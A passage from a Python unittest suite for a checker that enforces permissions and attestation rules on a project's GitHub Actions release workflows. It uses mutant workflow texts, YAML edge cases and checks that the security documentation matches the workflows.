    "accepted: the publish jobs' names, timeouts and comments": (
        RELEASE,
        both(
            in_job("publish-ios", "    timeout-minutes: 15\n", "    timeout-minutes: 20\n"),
            in_job(
                "publish-ios",
                "      - name: Attach to the release\n",
                "      - name: Upload\n        timeout-minutes: 5\n",
            ),
            in_job(
                "publish-artefacts",
                "    name: Attest and attach the Android and web files\n",
                "    name: Publish\n",
            ),
            in_job("publish-artefacts", "    # A fresh runner", "    # A new runner"),
        ),
        [],
    ),
    "accepted: release-please's name, timeout and a Dependabot bump of its pin": (
        RELEASE,
        both(
            in_job("release-please", "    name: Release pull request\n", "    name: Release PR\n"),
            in_job("release-please", "    timeout-minutes: 10\n", "    timeout-minutes: 15\n"),
            in_job("release-please", f"@{RELEASE_PLEASE_PIN}", f"@{OTHER_PIN}"),
        ),
        [],
    ),
    "accepted: a workflow named release-notes.yml, which no gh takes for release.yml": (
        f"{crp.WORKFLOWS}/release-notes.yml",
        new_file(SIGNS),
        [],
    ),
    "accepted: a Dependabot bump of the publish jobs' pins": (
        RELEASE,
        both(
            in_job("publish-ios", f"@{ATTEST_PIN}", f"@{OTHER_PIN}"),
            in_job("publish-artefacts", f"@{DOWNLOAD_PIN}", f"@{OTHER_PIN}"),
        ),
        [],
    ),
    "accepted: the word secrets before a value's first expression": (
        RELEASE,
        in_job(
            "preflight",
            "        run: python3 tool/web/check_live.py app\n",
            '        run: echo "no secrets here" ${{ github.sha }}\n',
        ),
        [],
    ),
    "accepted: site-refresh.yml with read-all": (
        f"{crp.WORKFLOWS}/site-refresh.yml",
        sub("permissions:\n  contents: read\n", "permissions: read-all\n"),
        [],
    ),
    "accepted: release.yml without a top-level env": (
        RELEASE,
        sub(
            "env:\n  # Equal to ci.yml's; make docs-check checks them.\n"
            '  FLUTTER_VERSION: 3.47.9\n  JAVA_VERSION: "21"\n\n',
            "",
        ),
        [],
    ),
}


class Fixture(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)

    def write(self, path: str, text: str) -> str:
        target = self.root / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(text, encoding="utf-8")
        return path

    def problems(self, *paths: str) -> list[crp.Problem]:
        return crp.Checker(self.root).problems(list(paths))

    def workflows(self, changed: dict[str, str] | None = None) -> list[str]:
        """Every workflow's problems, with the texts in `changed` in place of the repository's."""
        texts = {**TEXTS, **(changed or {})}
        return [str(p) for p in self.problems(*(self.write(p, t) for p, t in texts.items()))]

    def assert_problems(self, found: list[str], *fragments: str | tuple[str, ...]) -> None:
        """One problem per fragment, in order; a tuple's parts must all be in its problem."""
        self.assertEqual(len(found), len(fragments), found)
        for problem, fragment in zip(found, fragments, strict=True):
            for part in fragment if isinstance(fragment, tuple) else (fragment,):
                self.assertIn(part, problem)


class RepositoryTest(Fixture):
    def test_the_repository_passes(self):
        files = crp.workflow_files(ROOT)
        self.assertEqual(sorted(files), sorted(TEXTS))
        self.assertEqual([str(p) for p in crp.Checker(ROOT).problems(files)], [])

    def test_the_workflows_pass_in_a_fixture(self):
        self.assertEqual(self.workflows(), [])

    def test_scorecard_keeps_its_oidc_token(self):
        # id-token: write stays allowed outside release.yml: its token fails SECURITY.md's
        # --signer-workflow with gh 2.102.0 or later, and the names older gh would take for
        # release.yml's are refused (R2).
        self.assertIn("      id-token: write", TEXTS[f"{crp.WORKFLOWS}/scorecard.yml"])

    def test_release_yml_as_in_1_4_2_fails(self):
        found = self.workflows({RELEASE: as_in_1_4_2(RELEASE_TEXT)})
        self.assert_problems(
            found,
            *(
                (f'R2: job "{job}" holds `{scope}: write`', IN_RELEASE)
                for job in ("artefacts", "ios")
                for scope in ("attestations", "contents", "id-token")
            ),
            'R6: release.yml has no job "publish-artefacts"',
            'R6: release.yml has no job "publish-ios"',
        )


class MutantTest(Fixture):
    def test_each_mutant_gives_exactly_its_problems(self):
        for name, (path, mutate, fragments) in MUTANTS.items():
            with self.subTest(mutant=name):
                mutated = mutate(TEXTS.get(path, ""))
                self.assertNotEqual(mutated, TEXTS.get(path, ""))
                self.assert_problems(self.workflows({path: mutated}), *fragments)

    def test_a_problem_names_the_file_and_line(self):
        path, mutate, _ = MUTANTS["publish: verify allows a self-hosted runner"]
        mutated = mutate(TEXTS[path])
        (problem,) = self.problems(self.write(path, mutated))
        start = mutated.index("\n  publish-ios:\n")
        run = mutated.index("        run: |\n          gh --version\n", start)
        line = mutated.count("\n", 0, run) + 1  # a block scalar starts at its `|`
        self.assertEqual((problem.path, problem.line), (RELEASE, line))
        self.assertEqual(str(problem), f"{RELEASE}:{line}: {problem.message}")
        self.assertIn(CHANGE_BOTH, problem.message)

    def test_a_mutant_whose_text_is_gone_fails_loudly(self):
        with self.assertRaisesRegex(AssertionError, "occurs 0 times"):
            once(RELEASE_TEXT, "no such text", "")
        with self.assertRaisesRegex(AssertionError, "occurs 2 times"):
            once(RELEASE_TEXT, BUILD_HEADER, "")


class FixtureTest(Fixture):
    def test_files_it_cannot_read(self):
        self.write(f"{crp.WORKFLOWS}/broken.yml", "jobs: [\n")
        (self.root / f"{crp.WORKFLOWS}/binary.yml").write_bytes(b"\xff\xfe\x00")
        self.write(f"{crp.WORKFLOWS}/complex.yml", "permissions: {}\njobs:\n  ? [a, b]\n  : c\n")
        found = [
            str(p)
            for p in self.problems(
                f"{crp.WORKFLOWS}/broken.yml",
                f"{crp.WORKFLOWS}/binary.yml",
                f"{crp.WORKFLOWS}/complex.yml",
                f"{crp.WORKFLOWS}/gone.yml",
                RELEASE,
            )
        ]
        self.assert_problems(
            found,
            f"{crp.WORKFLOWS}/broken.yml:1: cannot read it (",
            f"{crp.WORKFLOWS}/binary.yml:1: cannot read it (",
            f"{crp.WORKFLOWS}/complex.yml:3: cannot read it: a key that is not text",
            f"{crp.WORKFLOWS}/gone.yml:1: cannot read it (",
            f"{RELEASE}:1: cannot read it (",
        )

    def test_an_empty_workflow_declares_no_permissions(self):
        found = self.workflows({f"{crp.WORKFLOWS}/empty.yml": ""})
        self.assert_problems(found, f"{crp.WORKFLOWS}/empty.yml:1: R1: set the workflow's")

    def test_release_yml_is_required(self):
        path = self.write(f"{crp.WORKFLOWS}/ci.yml", TEXTS[f"{crp.WORKFLOWS}/ci.yml"])
        self.assert_problems(
            [str(p) for p in self.problems(path)],
            f"{RELEASE}:1: R6: release.yml is missing, so no job attaches a release's files",
        )

    def test_release_yml_without_jobs(self):
        text = RELEASE_TEXT[: RELEASE_TEXT.index("\njobs:\n") + 1]
        self.assert_problems(
            self.workflows({RELEASE: text}),
            'R5: release.yml has no job "release-please"',
            'R6: release.yml has no job "publish-artefacts"',
            'R6: release.yml has no job "publish-ios"',
        )

    def test_release_please_without_steps(self):
        found = self.workflows(
            {
                RELEASE: replace_job("release-please", "  release-please:\n    runs-on: x\n\n")(
                    RELEASE_TEXT
                )
            }
        )
        self.assert_problems(
            found,
            RELEASE_PLEASE + "runs-on: 'ubuntu-24.04', found 'x'",
            RELEASE_PLEASE + "permissions: missing; the template has {",
            RELEASE_PLEASE + "outputs: missing; the template has {",
            RELEASE_PLEASE + "steps: missing; the template has [",
        )

    def test_an_alias_that_holds_itself(self):
        path = self.write(f"{crp.WORKFLOWS}/loop.yml", "permissions: {}\nLOOP: &loop [*loop]\n")
        self.assert_problems(
            [str(p) for p in self.problems(path)],
            f"{crp.WORKFLOWS}/loop.yml:1: cannot read it (maximum recursion depth exceeded",
            f"{RELEASE}:1: R6: release.yml is missing",
        )

    def test_line_breaks_a_yaml_1_2_reader_does_not_take(self):
        for char in ("\x85", "\u2028", "\u2029"):
            with self.subTest(char=f"U+{ord(char):04X}"):
                path = self.write(
                    f"{crp.WORKFLOWS}/breaks.yml", f"permissions: {{}}\n# a{char}jobs: {{}}\n"
                )
                self.assert_problems(
                    [str(p) for p in self.problems(path)],
                    f"{crp.WORKFLOWS}/breaks.yml:2: cannot read it: U+{ord(char):04X} is a line"
                    " break to PyYAML",
                    f"{RELEASE}:1: R6: release.yml is missing",
                )


UNDECLARED = """\
name: Other
on: push
jobs:
  attach:
    runs-on: ubuntu-24.04
    permissions:
      contents: write
    steps:
      - run: gh release upload "$TAG" dist/* --clobber --repo "$GITHUB_REPOSITORY"
"""


@unittest.skipIf(GIT is None, "git is not on PATH")
class MainTest(Fixture):
    def git(self, *args: str) -> None:
        subprocess.run([GIT, *args], cwd=self.root, check=True, capture_output=True)  # noqa: S603

    def run_main(self) -> tuple[int, str, str]:
        out, err = io.StringIO(), io.StringIO()
        with redirect_stdout(out), redirect_stderr(err):
            code = crp.main([str(self.root)])
        return code, out.getvalue(), err.getvalue()

    def test_only_tracked_workflow_files_are_read_and_the_exit_code_says_so(self):
        self.git("init", "-q")
        self.write(RELEASE, RELEASE_TEXT)
        self.write("tools/action.yml", UNDECLARED)  # an action, not a workflow
        self.git("add", ".")
        code, out, err = self.run_main()
        self.assertEqual((code, err), (0, ""))
        self.assertIn("Release provenance checks passed (1 workflow file(s)).", out)
        # An untracked workflow is not read; a tracked one that declares no permissions and
        # writes contents fails twice.
        self.write(f"{crp.WORKFLOWS}/untracked.yml", UNDECLARED)
        code, out, err = self.run_main()
        self.assertEqual((code, err), (0, ""))
        self.write(f"{crp.WORKFLOWS}/tracked.yml", UNDECLARED)
        self.git("add", f"{crp.WORKFLOWS}/tracked.yml")
        code, out, err = self.run_main()
        self.assertEqual((code, out), (1, ""))
        self.assertEqual(err.count("\n"), 2, err)
        self.assertIn("tracked.yml:1: R1:", err)
        self.assertIn('tracked.yml:7: R2: job "attach" holds `contents: write`', err)
        self.assertNotIn("untracked.yml", err)

    def test_run_as_a_script_it_exits_with_main_s_code(self):
        self.git("init", "-q")
        self.write(RELEASE, RELEASE_TEXT)
        self.git("add", ".")
        out, err = io.StringIO(), io.StringIO()
        argv = sys.argv
        self.addCleanup(setattr, sys, "argv", argv)
        sys.argv = [crp.__file__, str(self.root)]
        with redirect_stdout(out), redirect_stderr(err), self.assertRaises(SystemExit) as raised:
            runpy.run_path(crp.__file__, run_name="__main__")
        self.assertEqual((raised.exception.code, err.getvalue()), (0, ""))
        self.assertIn("Release provenance checks passed (1 workflow file(s)).", out.getvalue())


class DocsTest(unittest.TestCase):
    """SECURITY.md tells people to check a download with the files and options the publish jobs
    attach and check with, and docs/operations.md lists the secrets the check knows."""

    def test_security_md_names_the_files_and_options_the_publish_jobs_use(self):
        security = (ROOT / "SECURITY.md").read_text(encoding="utf-8")
        self.assertIn("## Checking a download", security)
        names = re.findall(r"^ {10}PROVENANCE: (dist/.+)$", RELEASE_TEXT, re.M)
        self.assertEqual(len(names), 2, names)
        for name in names:
            shown = name.removeprefix("dist/").replace(TAG, "vX.Y.Z")
            self.assertIn(f"`{shown}`", security)
            self.assertIn(f"--bundle {shown}", security)
        (command,) = re.findall(r"^```sh\n(gh attestation verify .*?)^```$", security, re.M | re.S)
        verify = crp.template("publish-ios")["steps"][3]["run"]
        options = re.findall(r"(?<!\S)--[a-z-]+", verify[verify.index("gh attestation verify") :])
        self.assertEqual(
            options,
            [
                "--bundle",
                "--repo",
                "--signer-workflow",
                "--source-ref",
                "--deny-self-hosted-runners",
            ],
        )
        for option in options:
            self.assertRegex(command, rf"(?<!\S){option}(?!\S)")
        source_ref = re.search(r"--source-ref (\S+)", verify)[1]
        self.assertIn(f"--source-ref {source_ref} ", command)
        self.assertRegex(command, r"--signer-workflow \S+/\S+/\.github/workflows/release\.yml")

    def test_the_settings_table_lists_the_known_secrets(self):
        operations = (ROOT / "docs/operations.md").read_text(encoding="utf-8")
        rows = re.findall(r"^\| `([A-Z0-9_]+)` +\| secret +\|", operations, re.M)
        self.assertEqual(sorted(rows), sorted(crp.KNOWN_SECRETS - {"GITHUB_TOKEN"}))


if __name__ == "__main__":
    unittest.main()
